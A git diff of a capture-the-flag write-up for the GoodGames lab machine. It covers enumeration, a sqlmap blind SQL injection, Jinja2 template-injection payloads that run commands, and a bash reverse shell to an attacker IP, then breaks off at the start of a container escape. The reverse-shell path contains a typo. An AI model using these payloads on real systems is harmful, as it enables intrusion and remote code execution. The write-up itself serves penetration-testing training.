@@ -11,7 +11,6 @@
 
 ####
 ####
-####
 ## Open ports in target machine
 ### Nmap
 After spawm machine we need to make a recognition phase, **nmap** is very hepful to discover the ports and services that is running over target machine.
@@ -33,7 +32,7 @@ After spawm machine we need to make a recognition phase, **nmap** is very hepful
 ### HTTP
 If we access the website using the domain reported by **nmap**: http://goodgames.htb, we won't find anything; it's a video game store-type website, but we see no extra information such as a login or registration link. At this point, the obvious thing to do is enumeration to discover directories or files. Let's use **wfuzz**:
 ####
-```js
+```ruby
 wfuzz -c -u 'http://goodgames.htb/FUZZ' -w /usr/share/wordlists/dictionary/web-content/directory-list-lowercase-2.3-medium.txt -t 150 --hw 548,5548
 ```
 ####
@@ -46,7 +45,7 @@ wfuzz -c -u 'http://goodgames.htb/FUZZ' -w /usr/share/wordlists/dictionary/web-c
 ####
 The gobuster report us the nex information:
 ####
-```perl
+```ruby
 000000086:   200        266 L    545  W      9267 Ch      "profile"
 000000053:   200        266 L    553  W      9294 Ch      "login"
 000000032:   200        908 L    2572 W     44206 Ch      "blog"
@@ -61,7 +60,7 @@ This means the **email** field is probably vulnerable to a more sophisticated at
 ### SQLI
 To perform an injection, we need the **cookies** given when we log in, as well as other necessary fields. For this, we need to intercept the login request with **Burpsuite** to generate an **item** in *XML* format to pass to sqlmap: `sqlmap -r intercepted_request`. Once sqlmap finishes evaluating the request, it shows us this on the screen:
 ####
-```perl
+```ruby
 Parameter: email (POST)
 Type: time-based blind
 Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
@@ -115,7 +114,6 @@ In this case, sqlmap conveniently dumped the contents of the **user** table colu
 ## First exploitation phase
 ### Subdomain
 When we log in as **admin**, at the top there's a nav with a **settings** icon; clicking it takes us to a new subdomain: http://internal-administration.goodgames.htb/. If we add it to `/etc/hosts` and access it, it takes us a *Flask Volt* login panel.
-
 ####
 It appears to be an administration dashboard; we don't know the credentials, but we have those for **admin**, so if we try `admin:superadministrator`, we gain access as the admin user in the dashboard. Earlier we saw **Flask**, so Python might be running in the background.
 ####
@@ -135,32 +133,34 @@ Indeed, the result of the operation is reflected in the **Profile Card**. We nee
 ### Jinja2
 If we look for payloads to exploit *SSTI* on sites like: https://github.com/swisskyrepo/PayloadsAllTheThings, we'll find many payloads to read files and execute commands. The idea is to determine if we can execute system-level commands:
 ####
-```perl
+```ruby
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
 ```
 ####
 This payload shows us the root user's id in the **Profile Card**, so if we gain access, we would do so as the highest-privileged user. Let's check if the victim machine can communicate with us; we'll listen with **tcpdump** to intercept *ICMP* traffic and modify the payload so that instead of executing the `id` command, it does a ping:
 ####
-```perl
-Target machine ->
-sudo tcpdump -i tun0 icmp
-{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ping -c 1 10.10.16.6').read() }}
+```ruby
+Target Machine ->
+    1. sudo tcpdump -i tun0 icmp
 
-Local machine ->
-22:26:26.036789 IP goodgames.htb > 10.10.16.6: ICMP echo request, id 398, seq 1, length 64
-22:26:26.036817 IP 10.10.16.6 > goodgames.htb: ICMP echo reply, id 398, seq 1, length 64
+Payload Used ->
+    {{ self.__init__.__globals__.__builtins__.__import__('os').popen('ping -c 1 10.10.16.6').read() }}
+
+Local Machine ->
+    22:26:26.036789 IP goodgames.htb > 10.10.16.6: ICMP echo request, id 398, seq 1, length 64
+    22:26:26.036817 IP 10.10.16.6 > goodgames.htb: ICMP echo reply, id 398, seq 1, length 64
 ```
 ####
 We receive the ICMP trace, so we'll try running different one-liners, since we don't know if the system has tools like **nc**, **bash**, or if it performs any sanitization.
 ####
-```perl
+```ruby
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /de/tcp/10.10.16.6/1234 0>&1"').read() }}
 ```
 ####
 ####
 ####
 ## Second exploit phase (Privilage Escalation)
-### Docker:
+### Docker
 Unfortunately, if we run the `ifconfig` command, we'll realize we are inside a container, so we'll need to escape it and target the real machine. But not before retrieving the flag, which we have access to. We are in container `172.19.0.2`, but if we are two, who is 1? We'll perform internal port enumeration. It would be much easier to do it in Python, but for that, the machine must have it installed. If we run:
 ####
 ```bash
